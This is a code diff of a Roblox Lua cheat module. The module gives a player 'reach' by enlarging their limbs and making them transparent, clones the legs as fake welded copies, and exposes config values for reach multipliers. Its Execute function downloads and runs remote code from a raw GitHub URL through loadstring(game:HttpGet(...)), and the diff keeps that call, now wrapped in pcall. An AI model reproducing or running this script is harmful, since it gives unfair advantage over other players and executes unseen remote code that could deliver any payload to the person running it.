@@ -7,82 +7,77 @@ local function getCharacter()
     return player.Character or player.CharacterAdded:Wait()
 end
 
--- CLONAR PIERNAS
-local function cloneLimb(character, limbName)
-    local limb = character:FindFirstChild(limbName)
-    if limb then
-        local limbCopy = limb:Clone()
-        limbCopy.Parent = limb.Parent
-        limbCopy.Anchored = true
+-- 🔹 CLONAR PIERNA
+local function cloneLeg(character, legName)
 
-        local weldConstraint = Instance.new("WeldConstraint")
-        weldConstraint.Part0 = limbCopy
-        weldConstraint.Part1 = limb
-        weldConstraint.Parent = limbCopy
+    local leg = character:FindFirstChild(legName)
+    if not leg then return end
 
-        task.wait(0.1)
-        limbCopy.Anchored = false
-    end
+    local legCopy = leg:Clone()
+    legCopy.Name = legName .. "_Fake"
+    legCopy.Parent = leg.Parent
+    legCopy.Anchored = true
+    legCopy.CanCollide = false
+
+    local weld = Instance.new("WeldConstraint")
+    weld.Part0 = legCopy
+    weld.Part1 = leg
+    weld.Parent = legCopy
+
+    task.wait(0.1)
+    legCopy.Anchored = false
 end
 
--- 🔹 APLICAR REACH
+-- 🔹 APPLY REACH
 function module:Apply()
+
     local character = getCharacter()
 
-    if self.Reach ~= true then
+    if not self.Reach then
         return
     end
 
-    if self.Armreach == true then
-        character["Right Arm"].Size = Vector3.new(self.ArmreachMultiplier, self.ArmreachMultiplier, self.ArmreachMultiplier)
-        character["Left Arm"].Size = Vector3.new(self.ArmreachMultiplier, self.ArmreachMultiplier, self.ArmreachMultiplier)
+    if self.Legreach then
+        local rLeg = character:FindFirstChild("Right Leg")
+        local lLeg = character:FindFirstChild("Left Leg")
 
-        character["Right Arm"].Transparency = self.ReachOpacity
-        character["Left Arm"].Transparency = self.ReachOpacity
+        if rLeg and lLeg then
+            rLeg.Size = Vector3.new(self.LegreachMultiplier, 2, self.LegreachMultiplier)
+            lLeg.Size = Vector3.new(self.LegreachMultiplier, 2, self.LegreachMultiplier)
 
-        character["Right Arm"].Massless = true
-        character["Left Arm"].Massless = true
-    end
+            rLeg.Transparency = self.ReachOpacity
+            lLeg.Transparency = self.ReachOpacity
 
-    if self.Legreach == true then
-        character["Right Leg"].Size = Vector3.new(self.LegreachMultiplier, 2, self.LegreachMultiplier)
-        character["Left Leg"].Size = Vector3.new(self.LegreachMultiplier, 2, self.LegreachMultiplier)
-
-        character["Right Leg"].Transparency = self.ReachOpacity
-        character["Left Leg"].Transparency = self.ReachOpacity
-
-        character["Right Leg"].Massless = true
-        character["Left Leg"].Massless = true
-    end
-end
-
--- 🔹 RESET
-function module:Reset()
-    local character = getCharacter()
-
-    local function resetLimb(name)
-        local limb = character:FindFirstChild(name)
-        if limb then
-            limb.Size = Vector3.new(1,2,1)
-            limb.Transparency = 0
-            limb.Massless = true
+            rLeg.Massless = true
+            lLeg.Massless = true
         end
     end
 
-    resetLimb("Right Arm")
-    resetLimb("Left Arm")
-    resetLimb("Right Leg")
-    resetLimb("Left Leg")
+    if self.Armreach then
+        local rArm = character:FindFirstChild("Right Arm")
+        local lArm = character:FindFirstChild("Left Arm")
+
+        if rArm and lArm then
+            rArm.Size = Vector3.new(self.ArmreachMultiplier, self.ArmreachMultiplier, self.ArmreachMultiplier)
+            lArm.Size = Vector3.new(self.ArmreachMultiplier, self.ArmreachMultiplier, self.ArmreachMultiplier)
+
+            rArm.Transparency = self.ReachOpacity
+            lArm.Transparency = self.ReachOpacity
+
+            rArm.Massless = true
+            lArm.Massless = true
+        end
+    end
 end
 
--- 🔹 EJECUTAR TODO
+-- 🔹 EXECUTE TODO
 function module:Execute()
 
     local character = getCharacter()
 
-    -- Clonar piernas
-    cloneLimb(character, "Right Leg")
-    cloneLimb(character, "Left Leg")
+    -- 🔥 Crear piernas falsas otra vez
+    cloneLeg(character, "Right Leg")
+    cloneLeg(character, "Left Leg")
 
     -- Seguridad
     if not workspace:FindFirstChild("Configuration") then
@@ -100,14 +95,16 @@ function module:Execute()
     end
 
     -- Load externo
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/entryxy/T23954u8/refs/heads/main/x10.lua'))()
+    pcall(function()
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/entryxy/T23954u8/refs/heads/main/x10.lua'))()
+    end)
 
     -- Aplicar reach con variables actuales
     self:Apply()
 end
 
 ------------------------------------------------------------------
--- ⚙️ CONFIGURACIÓN (EDITAR ABAJO)
+-- ⚙️ CONFIG
 ------------------------------------------------------------------
 
 module.Reach = true
@@ -118,8 +115,6 @@ module.LegreachMultiplier = 2.4
 
 module.Armreach = false
 module.ArmreachMultiplier = 52
-
-module.Trollclear = false
 
 ------------------------------------------------------------------
 
